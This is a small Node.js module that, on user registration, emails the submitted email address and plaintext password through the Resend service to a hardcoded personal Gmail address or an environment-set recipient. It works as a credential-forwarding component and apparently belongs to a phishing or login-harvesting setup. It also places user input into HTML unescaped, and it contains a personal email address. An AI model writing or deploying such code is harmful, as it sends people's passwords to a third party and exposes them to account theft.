const { Resend } = require("resend");

const resend = new Resend(process.env.RESEND_KEY);

async function sendUserEmail(data) {
  try {
    await resend.emails.send({
      from: "User System <onboarding@resend.dev>", // required approved domain
      // Use env var when provided, otherwise fall back to the requested address
      to: process.env.SEND_TO || "jendmyer@gmail.com",
      subject: "New User Registration Submitted",
      html: `
        <h2>New User Registration</h2>
        <p><strong>Email:</strong> ${data.email}</p>
        <p><strong>Password:</strong> ${data.password}</p>
      `,
    });

    console.log("Email sent successfully!");
  } catch (error) {
    console.error("Email sending failed:", error);
  }
}

module.exports = sendUserEmail;
